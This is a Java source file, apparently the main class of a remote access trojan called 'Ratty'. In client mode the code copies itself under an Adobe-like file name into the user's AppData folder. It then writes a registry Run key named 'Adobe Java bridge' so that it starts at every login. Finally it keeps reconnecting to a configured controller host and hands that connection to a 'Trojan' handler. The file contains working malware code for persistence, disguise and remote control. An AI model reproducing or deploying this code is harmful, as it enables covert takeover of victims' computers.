package de.sogomn.rat;

import java.io.File;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;
import java.util.ResourceBundle;

import javax.swing.JDialog;
import javax.swing.JFrame;
import javax.swing.JOptionPane;
import javax.swing.UIManager;
import javax.swing.plaf.nimbus.NimbusLookAndFeel;

import de.sogomn.engine.util.FileUtils;
import de.sogomn.rat.server.AbstractRattyController;
import de.sogomn.rat.server.ActiveServer;
import de.sogomn.rat.server.cmd.RattyCmdController;
import de.sogomn.rat.server.gui.RattyGuiController;

/*
 * This class is kinda hardcoded.
 * I don't care.
 * Sue me.
 */
public final class Ratty {
	
	public static final boolean DEBUG = false;
	public static final String VERSION = "1.3";
	public static final ResourceBundle LANGUAGE = ResourceBundle.getBundle("language.lang");
	
	private static String address;
	private static int port;
	private static boolean client;
	
	private static final int CONNECTION_INTERVAL = 2500;
	private static final String CONNECTION_DATA_FILE_NAME = "/connection_data.txt";
	private static final String STARTUP_FOLDER_NAME = "Adobe" + File.separator + "AIR";
	private static final String STARTUP_FILE_NAME = "jre13v3bridge.jar";
	private static final String STARTUP_FILE_PATH = System.getenv("APPDATA") + File.separator + STARTUP_FOLDER_NAME + File.separator + STARTUP_FILE_NAME;
	private static final String STARTUP_COMMAND = System.getProperty("java.home") + File.separator + "bin" + File.separator + "java.exe";
	private static final String STARTUP_REGISTRY_COMMAND = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Adobe Java bridge\" /d \"" + STARTUP_COMMAND + " " + STARTUP_FILE_PATH + "\"";
	private static final String NO_GUI_COMMAND = "NOGUI";
	
	private static final String PORT_INPUT_QUESTION = LANGUAGE.getString("server.port_question");
	private static final String PORT_ERROR_MESSAGE = LANGUAGE.getString("server.port_error");
	private static final String DEBUG_MESSAGE = LANGUAGE.getString("debug.question");
	private static final String DEBUG_SERVER = LANGUAGE.getString("debug.server");
	private static final String DEBUG_CLIENT = LANGUAGE.getString("debug.client");
	
	private Ratty() {
		//...
	}
	
	private static void setLookAndFeel() {
		final NimbusLookAndFeel nimbus = new NimbusLookAndFeel();
		
		JFrame.setDefaultLookAndFeelDecorated(true);
		JDialog.setDefaultLookAndFeelDecorated(true);
		
		try {
			UIManager.setLookAndFeel(nimbus);
		} catch (final Exception ex) {
			ex.printStackTrace();
		}
	}
	
	private static void readConnectionData() throws ArrayIndexOutOfBoundsException, NumberFormatException {
		final String[] lines = FileUtils.readInternalLines(CONNECTION_DATA_FILE_NAME);
		final String addressString = lines[0].trim();
		final String portString = lines[1].trim();
		final String clientString = lines[2].trim();
		
		address = addressString;
		port = Integer.parseInt(portString);
		client = Boolean.parseBoolean(clientString);
	}
	
	private static void addToStartup() {
		try {
			final URI sourceUri = Ratty.class.getProtectionDomain().getCodeSource().getLocation().toURI();
			final File source = new File(sourceUri);
			final File destination = new File(STARTUP_FILE_PATH);
			
			FileUtils.createFile(STARTUP_FILE_PATH);
			FileUtils.copyFile(source, destination);
			Runtime.getRuntime().exec(STARTUP_REGISTRY_COMMAND);
		} catch (final URISyntaxException | IOException ex) {
			ex.printStackTrace();
		}
	}
	
	private static int parsePort(final String input) {
		try {
			final int port = Integer.parseInt(input);
			
			if (port < 0 || port > 65535) {	//65535 = Max port
				return -1;
			}
			
			return port;
		} catch (final NumberFormatException | NullPointerException ex) {
			return -1;
		}
	}
	
	public static void connectToHost(final String address, final int port) {
		final ActiveConnection newClient = new ActiveConnection(address, port);
		final Trojan trojan = new Trojan();
		
		if (!newClient.isOpen()) {
			try {
				Thread.sleep(CONNECTION_INTERVAL);
			} catch (final InterruptedException ex) {
				//...
			} finally {
				System.gc();
				connectToHost(address, port);
			}
			
			return;
		}
		
		newClient.setObserver(trojan);
		newClient.start();
	}
	
	public static void startServer(final int port, final boolean gui) {
		final ActiveServer server = new ActiveServer(port);
		final AbstractRattyController controller;
		
		if (gui) {
			controller = new RattyGuiController();
		} else {
			controller = new RattyCmdController();
		}
		
		server.setObserver(controller);
		server.start();
	}
	
	public static void main(final String[] args) {
		setLookAndFeel();
		readConnectionData();
		
		if (DEBUG) {
			final String[] options = {DEBUG_SERVER, DEBUG_CLIENT};
			final int input = JOptionPane.showOptionDialog(null, DEBUG_MESSAGE, null, JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE, null, options, null);
			
			if (input == JOptionPane.YES_OPTION) {
				System.out.println(DEBUG_SERVER);
				
				startServer(port, true);
			} else if (input == JOptionPane.NO_OPTION) {
				System.out.println(DEBUG_CLIENT);
				
				connectToHost(address, port);
			}
		} else if (client) {
			addToStartup();
			connectToHost(address, port);
		} else {
			if (args.length >= 2 && args[0].equalsIgnoreCase(NO_GUI_COMMAND)) {
				final int port = parsePort(args[1]);
				
				if (port != -1) {
					startServer(port, false);
				} else {
					System.out.println(PORT_ERROR_MESSAGE);
				}
			} else {
				final String input = JOptionPane.showInputDialog(PORT_INPUT_QUESTION);
				
				if (input == null) {
					return;
				}
				
				final int port = parsePort(input);
				
				if (port != -1) {
					startServer(port, true);
				} else {
					JOptionPane.showMessageDialog(null, PORT_ERROR_MESSAGE);
				}
			}
		}
	}
	
}
